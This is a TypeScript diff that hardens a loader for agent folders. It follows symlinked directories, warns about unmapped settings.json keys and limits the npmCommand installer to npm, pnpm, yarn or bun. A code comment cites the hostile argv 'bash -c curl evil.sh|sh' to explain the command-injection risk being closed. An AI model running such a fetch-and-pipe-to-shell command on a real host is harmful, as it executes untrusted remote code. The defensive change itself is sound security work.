@@ -4,7 +4,7 @@
 // malformed JSON are hard errors; everything else unexpected is a warning + continue.
 
 import type { Dirent } from 'node:fs';
-import { readdir } from 'node:fs/promises';
+import { lstat, readdir, stat } from 'node:fs/promises';
 import { join, resolve } from 'node:path';
 
 import { readPackageSpecs, type NpmPackageSpec } from './packages.js';
@@ -28,7 +28,10 @@ export interface AgentSettings {
   readonly defaultThinkingLevel?: ThinkingLevel;
   /** Parsed `npm:` package sources from settings.json's `packages` key — see `./packages.js`. */
   readonly packages?: readonly NpmPackageSpec[];
-  /** Installer argv prefix from settings.json's `npmCommand` (e.g. `["npm"]`); `npm` when absent. */
+  /**
+   * Installer argv from settings.json's `npmCommand`; `["npm"]` when absent.
+   * Always exactly one of `npm`/`pnpm`/`yarn`/`bun` — see `readNpmCommand`.
+   */
   readonly npmCommand?: readonly string[];
 }
 
@@ -125,7 +128,7 @@ export async function loadAgentFolder(dir: string): Promise<AgentFolder> {
     appendSystemFilePath: join(abs, 'APPEND_SYSTEM.md'),
     settings: await loadSettings(abs, byName.has('settings.json'), warnings),
     providersJson: await loadProviders(abs, byName.has('models.json'), warnings),
-    skillsDir: resolveSkillsDir(abs, byName.get('skills'), warnings),
+    skillsDir: await resolveSkillsDir(abs, byName.get('skills'), warnings),
     extensionFiles: await loadExtensions(abs, byName.get('extensions'), warnings),
     sandbox: await loadSandbox(abs, byName.get('sandbox'), warnings),
     warnings
@@ -139,6 +142,25 @@ async function readAgentDir(abs: string): Promise<Dirent[]> {
     if (hasErrorCode(error, 'ENOENT') || hasErrorCode(error, 'ENOTDIR')) {
       throw new Error(`agent folder not found: ${abs}`, { cause: error });
     }
+    throw error;
+  }
+}
+
+/**
+ * `readdir(..., { withFileTypes: true })` Dirents don't follow symlinks, so
+ * `entry.isDirectory()` is false for a symlink-to-directory (e.g.
+ * `ln -s ../shared-skills skills`). `stat` follows the link — a symlink to a
+ * directory must behave exactly like a real directory. A symlink to a file,
+ * or a broken symlink (stat throws ENOENT), still isn't a directory and
+ * falls through to the caller's existing "must be a directory" warning.
+ */
+async function isDirectoryEntry(abs: string, entry: Dirent): Promise<boolean> {
+  if (entry.isDirectory()) return true;
+  if (!entry.isSymbolicLink()) return false;
+  try {
+    return (await stat(join(abs, entry.name))).isDirectory();
+  } catch (error) {
+    if (hasErrorCode(error, 'ENOENT')) return false;
     throw error;
   }
 }
@@ -157,20 +179,27 @@ function warnUnknownEntries(entries: readonly Dirent[], warnings: string[]): voi
 }
 
 /**
- * `settings.json` is pi's file — pi owns its schema, so cradle silently
- * leaves keys it doesn't map to CLI flags (`theme`, `quietStartup`,
- * `collapseChangelog`, …) to pi rather than warning on valid settings. Two
- * keys get cradle-side handling instead of a silent pass-through: `packages`
- * — pi's npm-distributed extension mechanism — is resolved and installed
- * per-agent (see `readPackageSpecs` in `./packages.js` for the npm: parsing
- * rules; `commands/start.ts` does the install + `-e` resolution), and
- * `npmCommand` selects the installer cradle shells out to for it (default
- * `npm`).
+ * `settings.json` uses pi's schema, but pi never reads the agent folder's
+ * copy — cradle delivers everything by argv, so a key only takes effect if
+ * cradle maps it. Three map to flags (`defaultProvider`/`defaultModel`/
+ * `defaultThinkingLevel` → `--provider`/`--model`/`--thinking`) and two get
+ * cradle-side handling: `packages` — pi's npm-distributed extension
+ * mechanism — is resolved and installed per-agent (see `readPackageSpecs` in
+ * `./packages.js` for the npm: parsing rules; `commands/start.ts` does the
+ * install + `-e` resolution), and `npmCommand` selects the installer cradle
+ * shells out to for it (default `npm`). Every other key (`theme`,
+ * `quietStartup`, `collapseChangelog`, …) has no delivery path — pi reads
+ * those from `~/.pi/agent/settings.json` or the project's
+ * `.pi/settings.json`, and exposes no flags for them — so cradle warns
+ * rather than silently dropping a key the author expects to apply. Cradle
+ * still never validates pi's schema: the warning names where the keys DO
+ * apply, not whether they're valid.
  */
 async function loadSettings(abs: string, present: boolean, warnings: string[]): Promise<AgentSettings> {
   if (!present) return {};
   const path = join(abs, 'settings.json');
   const json = await readJsonObject(path);
+  warnUnmappedSettingsKeys(json, path, warnings);
   const provider = readStringKey(json, 'defaultProvider', path, warnings);
   const model = readStringKey(json, 'defaultModel', path, warnings);
   const thinking = readThinkingLevel(json, path, warnings);
@@ -185,7 +214,45 @@ async function loadSettings(abs: string, present: boolean, warnings: string[]): 
   };
 }
 
-/** `npmCommand`: the installer argv prefix (e.g. `["pnpm"]`) — `commands/start.ts` appends `install`. */
+/**
+ * The complete set of settings.json keys cradle acts on — the three mapped
+ * to pi flags plus the two package-install keys `loadSettings` handles.
+ * Growing this set is the only way a new settings.json key ever takes
+ * effect; anything outside it triggers the unmapped-key warning.
+ */
+const MAPPED_SETTINGS_KEYS = new Set([
+  'defaultProvider',
+  'defaultModel',
+  'defaultThinkingLevel',
+  'packages',
+  'npmCommand'
+]);
+
+function warnUnmappedSettingsKeys(
+  record: { readonly [key: string]: JsonValue },
+  path: string,
+  warnings: string[]
+): void {
+  const unmapped = Object.keys(record).filter(key => !MAPPED_SETTINGS_KEYS.has(key));
+  if (unmapped.length > 0) {
+    warnings.push(
+      `${path}: keys cradle does not map are ignored — pi reads them from ~/.pi/agent/settings.json or ` +
+        `the project's .pi/settings.json, not the agent folder: ${unmapped.join(', ')}`
+    );
+  }
+}
+
+/**
+ * `npmCommand`: the installer cradle shells out to (`commands/start.ts`
+ * appends `install`) — on the host, unsandboxed, since install runs before
+ * the sandbox spawns. A hostile folder's settings.json is otherwise
+ * attacker-controlled JSON, so accepting arbitrary argv here (e.g.
+ * `["bash", "-c", "curl evil.sh|sh", "--"]`) would let a folder run
+ * arbitrary host commands. Only a single bare package-manager name is
+ * accepted — no paths, no flags, no extra argv.
+ */
+const NPM_COMMAND_ALLOWLIST = new Set(['npm', 'pnpm', 'yarn', 'bun']);
+
 function readNpmCommand(
   record: { readonly [key: string]: JsonValue },
   path: string,
@@ -193,11 +260,13 @@ function readNpmCommand(
 ): readonly string[] | undefined {
   const value = record['npmCommand'];
   if (value === undefined) return undefined;
-  if (!isStringArray(value) || value.some(item => item.trim() === '')) {
-    warnings.push(`${path}: npmCommand must be an array of non-empty strings — ignored`);
+  const [command, ...rest] = isStringArray(value) ? value : [];
+  if (command === undefined || rest.length > 0 || !NPM_COMMAND_ALLOWLIST.has(command)) {
+    const allowlist = [...NPM_COMMAND_ALLOWLIST].join(', ');
+    warnings.push(`${path}: npmCommand must be a single-element array naming one of ${allowlist} — ignored`);
     return undefined;
   }
-  return value.length > 0 ? value : undefined;
+  return [command];
 }
 
 async function loadProviders(abs: string, present: boolean, warnings: string[]): Promise<string | null> {
@@ -231,9 +300,9 @@ function fillModelCostDefaults(providers: { readonly [key: string]: JsonValue })
   );
 }
 
-function resolveSkillsDir(abs: string, entry: Dirent | undefined, warnings: string[]): string | null {
+async function resolveSkillsDir(abs: string, entry: Dirent | undefined, warnings: string[]): Promise<string | null> {
   if (!entry) return null;
-  if (!entry.isDirectory()) {
+  if (!(await isDirectoryEntry(abs, entry))) {
     warnings.push('skills must be a directory — ignored');
     return null;
   }
@@ -243,7 +312,7 @@ function resolveSkillsDir(abs: string, entry: Dirent | undefined, warnings: stri
 /** Mirror pi's own extension discovery shapes: top-level `extensions/*.ts` plus each subdir's `index.ts`. */
 async function loadExtensions(abs: string, entry: Dirent | undefined, warnings: string[]): Promise<string[]> {
   if (!entry) return [];
-  if (!entry.isDirectory()) {
+  if (!(await isDirectoryEntry(abs, entry))) {
     warnings.push('extensions must be a directory — ignored');
     return [];
   }
@@ -268,7 +337,7 @@ async function loadExtensions(abs: string, entry: Dirent | undefined, warnings: 
 
 async function loadSandbox(abs: string, entry: Dirent | undefined, warnings: string[]): Promise<AgentSandbox> {
   if (!entry) return EMPTY_SANDBOX;
-  if (!entry.isDirectory()) {
+  if (!(await isDirectoryEntry(abs, entry))) {
     warnings.push('sandbox must be a directory — ignored');
     return EMPTY_SANDBOX;
   }
@@ -292,13 +361,27 @@ async function loadSandbox(abs: string, entry: Dirent | undefined, warnings: str
   };
 }
 
-/** Read + parse sandbox/nono.json once; `undefined` when the file is absent. */
+/**
+ * Read + parse sandbox/nono.json once, through the same friendly-error path
+ * as settings.json/models.json (`readJsonObject` — the file may be an
+ * unreadable directory or a broken symlink, and both need path-named errors,
+ * not a raw fs error or a silent "absent"). `undefined` only when nothing
+ * exists at `path` at all: this file gates whether the run is sandboxed, so a
+ * dangling symlink must fail loudly rather than read as "no sandbox config".
+ */
 async function readSandboxJson(path: string): Promise<{ readonly [key: string]: JsonValue } | undefined> {
-  const text = await readTextIfExists(path);
-  if (text === undefined) return undefined;
-  const json = parseJson(text, path);
-  if (!isRecord(json)) throw new Error(`${path} must be a JSON object`);
-  return json;
+  return (await pathExists(path)) ? readJsonObject(path) : undefined;
+}
+
+/** `lstat` doesn't follow symlinks, so a dangling symlink still reports as present. */
+async function pathExists(path: string): Promise<boolean> {
+  try {
+    await lstat(path);
+    return true;
+  } catch (error) {
+    if (hasErrorCode(error, 'ENOENT')) return false;
+    throw error;
+  }
 }
 
 /** The old `net: "allow" | "block"` key was removed; point authors at `network`. */
